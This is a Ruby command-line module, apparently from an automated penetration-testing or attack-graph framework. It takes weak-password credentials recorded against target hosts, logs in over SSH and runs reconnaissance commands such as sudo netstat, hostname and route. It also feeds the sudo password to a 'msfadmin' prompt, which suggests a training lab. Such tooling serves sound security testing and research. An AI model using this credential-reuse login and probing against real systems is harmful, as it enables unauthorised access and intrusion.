require 'thor'
require 'net/ssh'

require_relative '../../../lib/xlib'

module XA
  module SSHAgent
    class Start < Thor
      option :session_id
      desc 'netstat', 'Start netstat probing on TARGETS'
      def netstat(targets_string)
        targets = XSP::Targets.from_string(targets_string)

        AttackGraph.with_session(options[:session_id]) do
          run('sudo netstat -tulpn', targets)
        end
      end

      option :session_id
      desc 'hostname', 'Start hostname probing on TARGETS'
      def hostname(targets_string)
        targets = XSP::Targets.from_string(targets_string)

        AttackGraph.with_session(options[:session_id]) do
          run('hostname', targets)
        end
      end

      option :session_id
      desc 'route', 'Start hostname probing on TARGETS'
      def route(targets_string)
        targets = XSP::Targets.from_string(targets_string)

        AttackGraph.with_session(options[:session_id]) do
          run('route', targets)
        end
      end

      private

      def run(cmd, targets)
        targets.targets_array.each do |target|
          a_node = AttackGraph::AttackNode.find(target)

          if a_node.has_vuln?(:weak_password)
            detail = a_node.vuln(:weak_password).detail
            caps   = detail.match(/login: (\w+), password: (\w+)/).captures

            if caps.any?
              username = caps[0]
              password = caps[1]

              puts ssh_exec(cmd, host:     a_node.addr,
                                 username: username,
                                 password: password)
            end
          end
        end
      end

      def ssh_exec(cmd, options={})
        result = ''
        Net::SSH.start(options[:host], options[:username], password: options[:password]) do |ssh|
          ssh.exec!(cmd) do |channel, stream, data|
            if data =~ /password for msfadmin/
              channel.send_data options[:password]
            else
              result << data
            end
          end
        end
        result
      end
    end

    class Application < Thor
      desc 'start STRATEGY TARGETS', 'Start ssh agenting on TARGETS with this STRATEGY'
      subcommand 'start', Start
    end
  end
end
